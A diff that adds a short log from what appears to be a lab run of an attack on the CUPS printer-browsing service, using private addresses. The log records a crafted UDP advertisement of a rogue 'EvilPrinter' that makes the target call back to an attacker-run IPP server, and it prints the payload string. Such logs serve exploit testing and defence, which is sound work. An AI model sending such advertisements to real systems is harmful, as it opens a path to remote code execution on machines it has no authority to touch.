@@ -1,0 +1,7 @@
+17:28:51 [INFO] target 172.18.0.2:631/udp
+17:28:51 [INFO] advertising ipp://172.18.0.1:8632/printers/EvilPrinter
+17:28:51 [DEBUG] callback uri: ipp://172.18.0.1:8632/printers/EvilPrinter
+17:28:51 [DEBUG] payload: 0 3 ipp://172.18.0.1:8632/printers/EvilPrinter
+17:28:51 [INFO] sending 1 advertisement(s)
+17:28:51 [INFO]   [1/1] sent, 46 bytes
+17:28:51 [INFO] no listener: look in printer.log or the pcap for the callback
